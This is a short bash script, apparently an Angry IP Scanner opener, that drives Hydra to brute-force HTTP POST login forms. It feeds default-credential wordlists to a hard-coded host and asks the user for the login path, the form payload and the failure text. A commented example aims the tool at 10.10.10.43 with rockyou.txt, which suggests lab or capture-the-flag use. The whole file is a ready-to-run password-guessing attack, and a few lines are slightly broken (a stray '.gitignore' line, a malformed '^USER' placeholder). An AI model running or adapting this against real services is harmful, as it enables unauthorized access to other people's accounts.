#!/bin/bash

# Angry IP openers lines (do not change the following 6 lines)
#   Name                :80_HTTP_HYDRA
#   Execution_string    :THIS_FILE ${fetcher.ip}
#   Run_in_Terminal     :TRUE
#   Directory           :

.gitignore
user_name_list="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/usernames/http_default_users.txt"
password_list="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/passwords/http_default_passwords.txt"

address="vulnerable.happycakefactory.com" # or 

# Ask the Dir
echo "What is the dir of the login, for example '/login' or '/db/index.php':"
read login_dir # login_dir="/" #/db/index.php

# Ask the payload
echo "What is the payload, for example 'user=^USER&pass=^PASS^':"
read payload # user=^USER&pass=^PASS^

# Ask the unsuccessful_text
echo "What text is displayed on an unsuccessful attempt, for example 'incorrect' or 'unsuccessful':"
read unsuccessful_text # user=^USER&pass=^PASS^

hydra -L $user_name_list -P $password_list -e n -m $login_dir $address http-post-form "$login_dir:$payload:$unsuccessful_text" -V -I

# hydra -L admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"